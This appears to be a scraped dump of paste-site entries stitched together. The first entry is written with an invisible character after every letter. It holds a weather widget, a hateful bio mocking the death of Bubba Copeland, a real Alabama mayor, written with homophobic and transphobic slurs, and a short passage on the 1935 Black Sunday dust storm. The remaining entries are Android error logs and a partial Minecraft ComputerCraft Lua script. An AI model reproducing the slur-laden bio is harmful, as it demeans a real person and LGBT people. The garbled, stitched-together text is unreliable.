S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé4‚Äé¬∞‚Äé
/‚Äé6‚Äé2‚Äé¬∞‚Äé
3‚Äé7‚Äé%‚Äé
 ‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéE‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚Äée‚Äég‚Äég‚Äés‚Äé.‚Äé ‚Äéüê£
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äéu‚Äéb‚Äéb‚Äéa‚Äé ‚ÄéC‚Äéo‚Äép‚Äée‚Äél‚Äéa‚Äén‚Äéd‚Äé
F‚Äér‚Äée‚Äéd‚Äé ‚ÄéL‚Äé.‚Äé ‚Äé""‚ÄéB‚Äéu‚Äéb‚Äéb‚Äéa‚Äé""‚Äé ‚ÄéC‚Äéo‚Äép‚Äée‚Äél‚Äéa‚Äén‚Äéd‚Äé,‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚Äé""‚ÄéB‚Äér‚Äéi‚Äét‚Äét‚Äén‚Äée‚Äéy‚Äé ‚ÄéB‚Äél‚Äéa‚Äéi‚Äér‚Äée‚Äé ‚ÄéS‚Äéu‚Äém‚Äém‚Äée‚Äér‚Äél‚Äéi‚Äén‚Äé""‚Äé‚öß‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äéw‚Äée‚Äéi‚Äér‚Äéd‚Äéo‚Äé,‚Äé ‚Äéc‚Äér‚Äée‚Äée‚Äép‚Äé,‚Äé ‚Äég‚Äéo‚Äéo‚Äén‚Äée‚Äér‚Äé,‚Äé ‚Äéf‚Äéa‚Äét‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äér‚Äéa‚Äén‚Äén‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéu‚Äép‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äéi‚Äéa‚Äén‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äée‚Äér‚Äév‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äée‚Äél‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äém‚Äéa‚Äéy‚Äéo‚Äér‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äéb‚Äéu‚Äél‚Äél‚Äés‚Äéh‚Äéi‚Äét‚Äé ‚Äéy‚Äée‚Äée‚Äéh‚Äéa‚Äéw‚Äé ‚Äér‚Äée‚Äéd‚Äén‚Äée‚Äéc‚Äék‚Äé ‚Äés‚Äéh‚Äéi‚Äét‚Äéh‚Äéo‚Äél‚Äée‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äéd‚Äé ‚ÄéS‚Äém‚Äéi‚Äét‚Äéh‚Äés‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéA‚Äél‚Äéa‚Äéb‚Äéa‚Äém‚Äéa‚Äé.‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äéd‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äél‚Äéi‚Äét‚Äée‚Äér‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äén‚Äéo‚Äét‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äés‚Äé ‚Äém‚Äéa‚Äéy‚Äéo‚Äér‚Äé,‚Äé ‚ÄéB‚Äéu‚Äéb‚Äéb‚Äéa‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äée‚Äéx‚Äép‚Äéo‚Äés‚Äée‚Äéd‚Äé ‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äéc‚Äér‚Äéo‚Äés‚Äés‚Äé-‚Äéd‚Äér‚Äée‚Äés‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéa‚Äég‚Äég‚Äéo‚Äét‚Äé.‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéw‚Äéh‚Äéo‚Äél‚Äée‚Äé ‚Äét‚Äér‚Äéa‚Äéi‚Äél‚Äée‚Äér‚Äé ‚Äép‚Äéa‚Äér‚Äék‚Äé ‚Äég‚Äéo‚Äéa‚Äét‚Äé-‚Äéf‚Äéu‚Äéc‚Äék‚Äée‚Äér‚Äé ‚Äéc‚Äéo‚Äém‚Äém‚Äéu‚Äén‚Äéi‚Äét‚Äéy‚Äé ‚Äéh‚Äée‚Äéc‚Äék‚Äél‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äér‚Äéi‚Äéd‚Äéi‚Äéc‚Äéu‚Äél‚Äée‚Äéd‚Äé ‚Äéh‚Äéi‚Äém‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéd‚Äér‚Äée‚Äés‚Äés‚Äéi‚Äén‚Äég‚Äé ‚Äéu‚Äép‚Äé ‚Äéi‚Äén‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéw‚Äéi‚Äéf‚Äée‚Äé'‚Äés‚Äé ‚Äéc‚Äél‚Äéo‚Äét‚Äéh‚Äée‚Äés‚Äé,‚Äé ‚ÄéB‚Äéu‚Äéb‚Äéb‚Äéa‚Äé ‚Äéh‚Äéi‚Äél‚Äéa‚Äér‚Äéi‚Äéo‚Äéu‚Äés‚Äél‚Äéy‚Äé ‚Äéa‚Äén‚Äé ‚Äéh‚Äée‚Äér‚Äéo‚Äé'‚Äéd‚Äé ‚Äéh‚Äéi‚Äém‚Äés‚Äée‚Äél‚Äéf‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéd‚Äée‚Äéa‚Äét‚Äéh‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äéo‚Äés‚Äéi‚Äét‚Äéi‚Äév‚Äée‚Äél‚Äéy‚Äé ‚Äér‚Äée‚Äéc‚Äée‚Äéi‚Äév‚Äée‚Äéd‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéd‚Äéi‚Äés‚Äéc‚Äéo‚Äév‚Äée‚Äér‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéh‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äéc‚Äér‚Äée‚Äée‚Äép‚Äé,‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äéa‚Äén‚Äéy‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äét‚Äér‚Äéo‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äée‚Äév‚Äée‚Äér‚Äé ‚Äée‚Äéx‚Äéi‚Äés‚Äét‚Äée‚Äéd‚Äé.‚Äé

A‚Äé ‚Äés‚Äéu‚Äép‚Äép‚Äéo‚Äés‚Äée‚Äéd‚Äé ‚Äé""‚ÄéR‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äé""‚Äé,‚Äé ‚Äé""‚ÄéC‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äéi‚Äéa‚Äén‚Äé""‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äé""‚ÄéC‚Äéo‚Äén‚Äés‚Äée‚Äér‚Äév‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äé""‚Äé,‚Äé ‚ÄéB‚Äéu‚Äéb‚Äéb‚Äéa‚Äé ‚Äéf‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéR‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚Äép‚Äér‚Äéa‚Äéc‚Äét‚Äéi‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äép‚Äér‚Äée‚Äéa‚Äéc‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äéf‚Äéa‚Äég‚Äés‚Äé ‚Äég‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äée‚Äél‚Äél‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéh‚Äéu‚Äég‚Äée‚Äé ‚Äéh‚Äéo‚Äém‚Äéo‚Äé ‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéa‚Äém‚Äée‚Äé ‚Äét‚Äéi‚Äém‚Äée‚Äé.‚Äé ‚ÄéW‚Äée‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äéa‚Äén‚Äét‚Äéi‚Äé-‚Äég‚Äéa‚Äéy‚Äé ‚ÄéR‚Äée‚Äép‚Äéu‚Äéb‚Äél‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äée‚Äéc‚Äér‚Äée‚Äét‚Äél‚Äéy‚Äé ‚Äég‚Äéa‚Äéy‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äéb‚Äéu‚Äét‚Äét‚Äée‚Äér‚Äéb‚Äéa‚Äél‚Äél‚Äé ‚Äéi‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äér‚Äéa‚Äéi‚Äén‚Äéb‚Äéo‚Äéw‚Äé-‚Äéc‚Äéo‚Äév‚Äée‚Äér‚Äée‚Äéd‚Äé ‚Äég‚Äér‚Äée‚Äéa‚Äés‚Äéy‚Äé ‚Äés‚Äéh‚Äée‚Äém‚Äéa‚Äél‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéw‚Äéa‚Äél‚Äék‚Äé ‚Äét‚Äéh‚Äér‚Äéo‚Äéu‚Äég‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äéu‚Äés‚Äéi‚Äén‚Äé-‚Äéd‚Äéi‚Äéd‚Äéd‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äés‚Äét‚Äéa‚Äét‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéA‚Äél‚Äéa‚Äéb‚Äéa‚Äém‚Äéa‚Äé.‚Äé

(‚Äé(‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéG‚Äéo‚Äéa‚Äél‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚ÄéT‚Äéo‚Äé ‚ÄéG‚Äéo‚Äé ‚ÄéP‚Äéo‚Äés‚Äét‚Äé ‚ÄéO‚Äép‚Äé ‚ÄéA‚Äén‚Äéd‚Äé ‚ÄéS‚Äée‚Äél‚Äél‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéA‚Äés‚Äés‚Äé ‚ÄéL‚Äéi‚Äék‚Äée‚Äé ‚ÄéA‚Äé ‚Äé2‚Äé ‚ÄéD‚Äéo‚Äél‚Äél‚Äéa‚Äér‚Äé ‚ÄéW‚Äéh‚Äéo‚Äér‚Äée‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚ÄéS‚Äéu‚Äén‚Äéd‚Äéa‚Äéy‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äéd‚Äéu‚Äés‚Äét‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéo‚Äéc‚Äéc‚Äéu‚Äér‚Äér‚Äée‚Äéd‚Äé ‚Äéo‚Äén‚Äé ‚ÄéA‚Äép‚Äér‚Äéi‚Äél‚Äé ‚Äé1‚Äé4‚Äé,‚Äé ‚Äé1‚Äé9‚Äé3‚Äé5‚Äé,‚Äé ‚Äéa‚Äés‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéD‚Äéu‚Äés‚Äét‚Äé ‚ÄéB‚Äéo‚Äéw‚Äél‚Äé,‚Äé ‚Äéa‚Äé ‚Äép‚Äée‚Äér‚Äéi‚Äéo‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äéd‚Äéu‚Äés‚Äét‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚Äép‚Äér‚Äéa‚Äéi‚Äér‚Äéi‚Äée‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äé1‚Äé9‚Äé3‚Äé0‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äé ‚Äéf‚Äéi‚Äér‚Äés‚Äét‚Äé ‚Äéh‚Äéi‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéO‚Äék‚Äél‚Äéa‚Äéh‚Äéo‚Äém‚Äéa‚Äé ‚Äép‚Äéa‚Äén‚Äéh‚Äéa‚Äén‚Äéd‚Äél‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äén‚Äéo‚Äér‚Äét‚Äéh‚Äéw‚Äée‚Äés‚Äét‚Äée‚Äér‚Äén‚Äé ‚ÄéO‚Äék‚Äél‚Äéa‚Äéh‚Äéo‚Äém‚Äéa‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äém‚Äéo‚Äév‚Äée‚Äéd‚Äé ‚Äés‚Äéo‚Äéu‚Äét‚Äéh‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äén‚Äéd‚Äéi‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äés‚Äée‚Äév‚Äée‚Äér‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéO‚Äék‚Äél‚Äéa‚Äéh‚Äéo‚Äém‚Äéa‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé ‚Äép‚Äéa‚Äén‚Äéh‚Äéa‚Äén‚Äéd‚Äél‚Äée‚Äés‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äé'‚Äés‚Äé ‚Äée‚Äéf‚Äéf‚Äée‚Äéc‚Äét‚Äés‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéf‚Äée‚Äél‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚Äés‚Äéu‚Äér‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äér‚Äée‚Äéa‚Äés‚Äé.‚Äé ‚ÄéD‚Äér‚Äéo‚Äéu‚Äég‚Äéh‚Äét‚Äé,‚Äé ‚Äée‚Äér‚Äéo‚Äés‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äéb‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äéo‚Äéi‚Äél‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéw‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéd‚Äéu‚Äés‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äéf‚Äél‚Äéy‚Äé ‚Äéf‚Äér‚Äée‚Äée‚Äél‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äét‚Äé ‚Äéh‚Äéi‚Äég‚Äéh‚Äé ‚Äés‚Äép‚Äée‚Äée‚Äéd‚Äés‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äée‚Äés‚Äét‚Äéi‚Äém‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äé3‚Äé0‚Äé0‚Äé,‚Äé0‚Äé0‚Äé0‚Äé ‚Äét‚Äéo‚Äén‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéo‚Äép‚Äés‚Äéo‚Äéi‚Äél‚Äé ‚Äéw‚Äée‚Äér‚Äée‚Äé ‚Äéd‚Äéi‚Äés‚Äép‚Äél‚Äéa‚Äéc‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äér‚Äéa‚Äéi‚Äér‚Äéi‚Äée‚Äé ‚Äéa‚Äér‚Äée‚Äéa‚Äé.‚Äé ‚ÄéB‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚ÄéS‚Äéu‚Äén‚Äéd‚Äéa‚Äéy‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äés‚Äét‚Äé ‚Äéd‚Äéu‚Äés‚Äét‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚Äéh‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äéd‚Äé ‚Äéi‚Äém‚Äém‚Äée‚Äén‚Äés‚Äée‚Äé ‚Äée‚Äéc‚Äéo‚Äén‚Äéo‚Äém‚Äéi‚Äéc‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äég‚Äér‚Äéi‚Äéc‚Äéu‚Äél‚Äét‚Äéu‚Äér‚Äéa‚Äél‚Äé ‚Äéd‚Äéa‚Äém‚Äéa‚Äég‚Äée‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚Äép‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äés‚Äéh‚Äéo‚Äéw‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äé ‚Äéa‚Äép‚Äép‚Äér‚Äéo‚Äéa‚Äéc‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚ÄéS‚Äét‚Äér‚Äéa‚Äét‚Äéf‚Äéo‚Äér‚Äéd‚Äé,‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé.‚Äé

P‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéG‚Äée‚Äéo‚Äér‚Äég‚Äée‚Äé ‚ÄéE‚Äév‚Äée‚Äér‚Äée‚Äét‚Äét‚Äé ‚ÄéM‚Äéa‚Äér‚Äés‚Äéh‚Äé ‚ÄéJ‚Äér‚Äé.‚Äé;‚Äé ‚Äér‚Äée‚Äés‚Äét‚Äéo‚Äér‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéY‚Äéa‚Äén‚Äén‚Äé ‚ÄéF‚Äéo‚Äér‚Äég‚Äée‚Äét‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéo‚Äéf‚Äéf‚Äée‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äéo‚Äéw‚Äén‚Äé ‚Äéc‚Äéo‚Äém‚Äéa‚Äé.‚Äé"
GEhrgP3V,2025-04-14T18:45:22.805921,powerampache,PHP,Monday 14th of April 2025 04:45:23 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
hrs4YhPZ,2025-04-14T18:45:22.871905,powerampache,PHP,Monday 14th of April 2025 04:45:23 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
pmijevYr,MEWarehouse,Shiny_Neko,Lua,Monday 14th of April 2025 04:28:19 PM CDT,"-- RSWarehouse.lua
-- Author: Chuck Burgess
-- Updated: 2024-01-15

local logFile = ""RSWarehouse.log""
local time_between_runs = 30

-- Initialize Monitor
-- see: https://www.computercraft.info/wiki/Advanced_Monitor
local monitor = peripheral.find(""monitor"")
if not monitor then error(""Monitor not found."") end
monitor.setTextScale(0.5)
monitor.clear()
monitor.setCursorPos(1, 1)
monitor.setCursorBlink(false)
print(""Monitor initialized."")
 
-- Initialize RS Bridge
-- see: https://advancedperipherals.madefor.cc/peripherals/rs_bridge/
local bridge = peripheral.find(""meBridge"")
if not bridge then error(""ME Bridge not found."") end
print(""ME Bridge initialized."")

-- Initialize Colony Integrator
-- see: https://docs.advanced-peripherals.de/peripherals/colony_integrator/
local colony = peripheral.find(""colonyIntegrator"")
if not colony then error(""Colony Integrator not found."") end
if not colony.isInColony then error(""Colony Integrator is not in a colony."") end
print(""Colony Integrator initialized."")
 
-- Establish the direction to transport the items into the Warehouse based on
-- where the entnglement block is sitting. Default to empty string.
local storage = peripheral.find(""entangled:tile"")
if not storage then error(""Warehouse storage not found."") end
local direction = """"
local names = peripheral.getNames()
for _, pos in ipairs(names) do
  if peripheral.getType(pos) == ""entangled:tile"" then
    direction = pos
    end
end
print(""Warehouse storage initialized."")

----------------------------------------------------------------------------
-- FUNCTIONS
----------------------------------------------------------------------------
--[[
  Table.Empty
  @desc     check to see if a table contains any data
  @return   boolean
]]
function table.empty (self)
    for _, _ in pairs(self) do
        return false
    end
    return true
end

--[[
    Write To Log
    @desc   Write the specified `table` to the file surrounded by the `blockTop` and `blockBottom`
    @return void
]]
function writeToLog(data, blockTop, blockBottom)
  file.write(""\n"")
  file.write(blockTop)
  file.write(""\n"")
  file.write(textutils.serialize(data, { allow_repetitions = true }))
  file.write(""\n"")
  file.write(blockBottom)
  file.write(""\n"")
end

--[[
    Process Work Request Item
    @desc Determine if this item can be delivered to the warehouse from the storage
    @return boolean
]]
function processWorkRequestItem(request)
  if string.find(request.desc, ""Tool of class"") then return false end
  if string.find(request.name, ""Hoe"") then return false end
  if string.find(request.name, ""Shovel"") then return false end
  if string.find(request.name, ""Axe"") then return false end
  if string.find(request.name, ""Pickaxe"") then return false end
  if string.find(request.name, ""Bow"") then return false end
  if string.find(request.name, ""Sword"") then return false end
  if string.find(request.name, ""Shield"") then return false end
  if string.find(request.name, ""Helmet"") then return false end
  if string.find(request.name, ""Leather Cap"") then return false end
  if string.find(request.name, ""Chestplate"") then return false end
  if string.find(request.name, ""Tunic"") then return false end
  if string.find(request.name, ""Pants"") then return false end
  if string.find(request.name, ""Leggings"") then return false end
  if string.find(request.name, ""Boots"") then return false end
  if request.name == ""Rallying Banner"" then return false end --bugged in alpha versions
  if request.name == ""Crafter"" then return false end
  if request.name == ""Compostable"" then return false end
  if request.name == ""Fertilizer"" then return false end
  if request.name == ""Flowers"" then return false end
  if request.name == ""Food"" then return false end
  if request.name == ""Fuel"" then return false end
  if request.name == ""Smeltable Ore"" then return false end
  if request.name == ""Stack List"" then return false end
  -- you can add any new items here if they are found
  return true
end

--[[
    Monitor Print Row Justified
    @desc   Print a line of data to the in-game monitor
    @return void
]]
function mPrintRowJustified(mon, y, pos, text, textcolor)
    w, h = mon.getSize()
    fg = colors.white
    bg = colors.black
 
    if pos == ""left"" then x = 1 end
    if pos == ""center"" then x = math.floor((w - #text) / 2) end
    if pos == ""right"" then x = w - #text end
  
    mon.setTextColor(textcolor)
    mon.setCursorPos(x, y)
    mon.write(text)
    mon.setTextColor(fg)
    mon.setBackgroundColor(bg)
end
 
--[[
    Display Timer
    @desc   Update the time on the monitor
    @return void
]]
function displayTimer(mon, t)
    now = os.time()
    cycle = ""day""
    cycle_color = colors.orange
    if now >= 4 and now < 6 then
        cycle = ""sunrise""
        cycle_color = colors.yellow
    elseif now >= 6 and now < 18 then
        cycle = ""day""
